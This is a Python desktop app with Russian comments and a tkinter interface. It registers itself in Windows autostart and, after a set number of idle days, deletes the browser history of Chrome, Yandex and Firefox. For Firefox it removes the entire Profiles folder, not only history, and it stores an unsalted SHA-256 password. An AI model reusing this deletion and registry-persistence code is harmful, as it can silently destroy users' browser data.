import winreg
import datetime
import json
from pathlib import Path
import shutil
import tkinter as tk
from tkinter import ttk, messagebox
import os
import hashlib

LAST_RUN_FILE = "last_run.json"
DEFAULT_DAYS = 3
CONFIG_DIR = "config"
CONFIG_FILE = Path(CONFIG_DIR) / "config.json"

# Пытается получить время последнего запуска из файла, если он существует.
# Если файла нет или он поврежден, функция возвращает None
def get_last_run_time():
    if os.path.exists(LAST_RUN_FILE):
        try:
            with open(LAST_RUN_FILE, "r") as f:
                data = json.load(f)
                return datetime.datetime.fromisoformat(data.get("last_run"))
        except (json.JSONDecodeError, KeyError):
            return None
    return None


# Сохраняет текущее время в файл, чтобы в следующий раз мы знали, когда запускались
def save_last_run_time():
    with open(LAST_RUN_FILE, "w") as f:
        json.dump({"last_run": datetime.datetime.now().isoformat()}, f)


# Пытается очистить историю указанных браузеров, удаляя файлы истории.
# Если какой-то браузер не установлен, функция просто пропускает его
def clear_browser_history():
    browsers = {
        "Chrome": Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "History",
        "Firefox": Path.home() / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles",
        "Yandex": Path.home() / "AppData" / "Local" / "Yandex" / "YandexBrowser" / "User Data" / "Default" / "History",
    }
    for browser_name, browser_path in browsers.items():
        print(f"Очистка истории {browser_name}...")
        if browser_name == "Firefox":
            if browser_path.exists():
                try:
                    shutil.rmtree(browser_path)
                    print(f"История {browser_name} очищена.")
                except Exception as e:
                    print(f"Ошибка очистки {browser_name}: {e}")
        else:
            if browser_path.exists():
                try:
                    browser_path.unlink()
                    print(f"История {browser_name} очищена.")
                except Exception as e:
                    print(f"Ошибка очистки {browser_name}: {e}")


# Добавляет программу в автозагрузку Windows, чтобы она запускалась при каждом включении компьютера
def add_to_startup(exe_path, app_name):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_ALL_ACCESS,
        )
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print("Программа добавлена в автозапуск.")
        return True
    except Exception as e:
        print(f"Ошибка добавления в автозапуск: {e}")
        return False


# Удаляет программу из автозагрузки Windows, чтобы она больше не запускалась автоматически
def remove_from_startup(app_name):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_ALL_ACCESS,
        )
        winreg.DeleteValue(key, app_name)
        winreg.CloseKey(key)
        print("Программа удалена из автозапуска.")
        return True
    except Exception as e:
        print(f"Ошибка удаления из автозапуска: {e}")
        return False


# Проверяет, находится ли программа в автозагрузке Windows
def is_in_startup(app_name):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_ALL_ACCESS,
        )
        winreg.QueryValueEx(key, app_name)
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False
    except Exception as e:
        print(f"Ошибка проверки автозапуска: {e}")
        return False


# Берет пароль и превращает его в хэш, чтобы безопасно хранить
def hash_password(password):
    hashed_password = hashlib.sha256(password.encode("utf-8")).hexdigest()
    return hashed_password


# Проверяет, соответствует ли введенный пароль сохраненному хэшу
def verify_password(entered_password, stored_hash):
    hashed_entered_password = hash_password(entered_password)
    return hashed_entered_password == stored_hash


# Создает и запускает основное окно приложения, обрабатывает все взаимодействия с пользователем
def main_app():
    root = tk.Tk()
    root.title("We Know What You Did Last Night Browser Cleaner")
    root.geometry("650x500")
    root.resizable(False, False)

    auto_start = tk.BooleanVar()
    days_var = tk.StringVar(value=str(DEFAULT_DAYS))
    password_hash = tk.StringVar()
    password_entered = tk.StringVar()
    is_password_set = tk.BooleanVar(value=False)

    # Загружает настройки приложения из файла, такие как состояние автозапуска и хэш пароля
    def load_config():
        if not os.path.exists(CONFIG_DIR):
            os.makedirs(CONFIG_DIR)

        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, "r") as f:
                    data = json.load(f)
                    auto_start.set(data.get("auto_start", False))
                    days_var.set(str(data.get("days", DEFAULT_DAYS)))
                    password_hash.set(data.get("password_hash", ""))
                    is_password_set.set(bool(data.get("password_hash", "")))
            except (json.JSONDecodeError, FileNotFoundError):
                auto_start.set(False)
                days_var.set(str(DEFAULT_DAYS))
                password_hash.set("")
                is_password_set.set(False)
        else:
            auto_start.set(False)
            days_var.set(str(DEFAULT_DAYS))
            password_hash.set("")
            is_password_set.set(False)

        if is_in_startup("WeKnowWhatYouDidLastNightBrowserCleaner"):
            auto_start.set(True)

    # Сохраняет настройки приложения в файл, такие как состояние автозапуска и хэш пароля
    def save_config():
        if not os.path.exists(CONFIG_DIR):
            os.makedirs(CONFIG_DIR)

        data = {
            "auto_start": auto_start.get(),
            "days": days_var.get(),
            "password_hash": password_hash.get(),
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(data, f)

    # Включает автозапуск программы
    def enable_autorun():
        if not is_password_set.get():
            messagebox.showerror("Ошибка", "Сначала установите пароль!")
            return

        exe_path = os.path.abspath("dist/WeKnowWhatYouDidLastNightBrowserCleaner.exe")
        app_name = "WeKnowWhatYouDidLastNightBrowserCleaner"

        if not is_in_startup(app_name):
            add_to_startup(exe_path, app_name)
        messagebox.showinfo("Успех", "Автозапуск включен!")
        auto_start.set(True)
        save_config()
        update_ui()
        update_status_label()

    # Выключает автозапуск программы
    def disable_autorun():
        if not verify_password(password_entered.get(), password_hash.get()):
            messagebox.showerror("Ошибка", "Неверный пароль!")
            return

        exe_path = os.path.abspath("dist/WeKnowWhatYouDidLastNightBrowserCleaner.exe")
        app_name = "WeKnowWhatYouDidLastNightBrowserCleaner"

        if is_in_startup(app_name):
            remove_from_startup(app_name)
        messagebox.showinfo("Успех", "Автозапуск выключен!")
        auto_start.set(False)
        save_config()
        update_ui()
        update_status_label()

    # Запускает процесс очистки истории браузеров вручную
    def run_cleaner():
        if messagebox.askyesno(
            "Подтверждение", "Вы уверены, что хотите очистить историю сейчас?"
        ):
            last_run_time = get_last_run_time()
            now = datetime.datetime.now()
            days = days_var.get()

            try:
                days = int(days)
            except ValueError:
                messagebox.showerror("Ошибка", "Введите целое число в поле дней")
                return

            if days <= 0:
                messagebox.showerror("Ошибка", "Число дней должно быть больше нуля")
                return

            if last_run_time:
                time_since_last_run = now - last_run_time
                if time_since_last_run > datetime.timedelta(days=days):
                    clear_browser_history()
                    messagebox.showinfo("Успех", "История браузеров очищена!")
                else:
                    messagebox.showinfo(
                        "Успех", "Прошло менее установленного времени, история не очищена."
                    )
            else:
                messagebox.showinfo(
                    "Информация",
                    "Это первый запуск скрипта или файл с прошлым временем запуска не найден.",
                )
            save_last_run_time()

    # Сохраняет новый пароль, предварительно проверив его на соответствие подтверждению
    def save_password():
        new_password = password_entry.get()
        confirm_password = confirm_password_entry.get()

        if not new_password or not confirm_password:
            messagebox.showerror(
                "Ошибка", "Пожалуйста, введите пароль и подтвердите его."
            )
            return

        if new_password != confirm_password:
            messagebox.showerror("Ошибка", "Пароли не совпадают.")
            return

        hashed_password = hash_password(new_password)
        password_hash.set(hashed_password)
        is_password_set.set(True)
        save_config()
        update_ui()

    # Создает виджеты для ввода пароля и отключения автозапуска
    def create_unlock_widgets():
        global password_unlock_label, password_unlock_entry, unlock_button, delete_password_button

        password_unlock_label = ttk.Label(right_frame, text="Введите пароль:")
        password_unlock_label.pack(pady=5, padx=5)

        password_unlock_entry = ttk.Entry(
            right_frame, textvariable=password_entered, show="*"
        )
        password_unlock_entry.pack(pady=5, padx=5)

        unlock_button = ttk.Button(
            right_frame, text="Выключить автозапуск", command=disable_autorun, style="Red.TButton"
        )
        unlock_button.pack(pady=5, padx=5)

        delete_password_button = ttk.Button(
            right_frame,
            text="Удалить пароль",
            command=delete_password,
            state=tk.DISABLED if auto_start.get() else tk.NORMAL,
        )
        delete_password_button.pack(pady=5, padx=5)

    # Удаляет сохраненный пароль, если введен верный пароль
    def delete_password():
        if verify_password(password_entered.get(), password_hash.get()):
            password_hash.set("")
            is_password_set.set(False)
            save_config()
            update_ui()

        else:
            messagebox.showerror("Ошибка", "Неверный пароль!")

    # Создает виджеты для установки нового пароля
    def create_set_password_widgets():
        global password_label, password_entry, confirm_password_label, confirm_password_entry, save_password_button

        password_label = ttk.Label(right_frame, text="Новый пароль:")
        password_label.pack(pady=5, padx=5)

        password_entry = ttk.Entry(right_frame, show="*")
        password_entry.pack(pady=5, padx=5)

        confirm_password_label = ttk.Label(right_frame, text="Подтвердите пароль:")
        confirm_password_label.pack(pady=5, padx=5)

        confirm_password_entry = ttk.Entry(right_frame, show="*")
        confirm_password_entry.pack(pady=5, padx=5)

        save_password_button = ttk.Button(
            right_frame, text="Сохранить пароль", command=save_password
        )
        save_password_button.pack(pady=5, padx=5)

    # Обновляет правую часть окна в зависимости от того, установлен ли пароль
    def update_ui():
        for widget in right_frame.winfo_children():
            widget.destroy()

        if is_password_set.get():
            create_unlock_widgets()
        else:
            create_set_password_widgets()

    # Обновляет надпись о статусе автозапуска
    def update_status_label():
        if auto_start.get():
            status_label.config(text="ВКЛЮЧЕНА", foreground="green")
        else:
            status_label.config(text="ВЫКЛЮЧЕНА", foreground="red")

    description_label = ttk.Label(
        root,
        text="Это приложение автоматически очищает историю браузеров (Chrome, Firefox, Yandex).\n"
        "Оно работает, запускаясь при включении компьютера.\n"
        "Вы можете настроить, через сколько дней, если не открывался ПК, будет происходить очистка истории.",
        wraplength=500,
        justify="center",
    )
    description_label.pack(pady=20, padx=20)

    status_label = ttk.Label(root, text="", font=("Arial", 12, "bold"))
    status_label.pack(pady=5)

    center_frame = ttk.Frame(root)
    center_frame.pack(expand=True)

    enable_button = ttk.Button(
        center_frame, text="Включить автозапуск", command=enable_autorun
    )
    enable_button.pack(pady=10)

    days_label = ttk.Label(center_frame, text="Очищать историю через (дней):")
    days_label.pack(pady=0)

    days_entry = ttk.Entry(center_frame, textvariable=days_var, width=10)
    days_entry.pack(pady=5)

    cleaner_button = ttk.Button(
        center_frame, text="Очистить историю сейчас", command=run_cleaner
    )
    cleaner_button.pack(pady=10)

    right_frame = ttk.Frame(root)
    right_frame.pack(side=tk.RIGHT, padx=20, pady=20, fill=tk.Y)

    style = ttk.Style()
    style.configure("Red.TButton", foreground="red")

    load_config()
    update_ui()
    update_status_label()

    root.mainloop()


if __name__ == "__main__":
    main_app()
